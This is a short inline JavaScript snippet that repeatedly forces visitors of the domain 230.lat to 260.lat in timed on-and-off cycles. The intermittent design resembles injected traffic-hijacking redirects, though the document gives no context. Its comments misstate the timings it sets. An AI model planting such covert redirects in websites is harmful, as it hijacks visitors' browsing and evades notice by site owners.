<script>
(function () {
    const allowedDomains = ["230.lat", "www.230.lat"];
    const targetURL = "https://260.lat";

    // Time in milliseconds
    const activeTime = 3 * 60 * 1000;  // 5 minutes
    const pauseTime = 10 * 60 * 1000;  // 20 minutes

    function startCycle() {
        // Run redirect only if domain matches
        if (allowedDomains.includes(location.hostname)) {
            const interval = setInterval(() => {
                location.href = targetURL;
            }, 50); // redirect loop while active

            // Stop after 5 min
            setTimeout(() => {
                clearInterval(interval);
                setTimeout(startCycle, pauseTime); // Restart after pause
            }, activeTime);
        }
    }

    startCycle();
})();
</script>
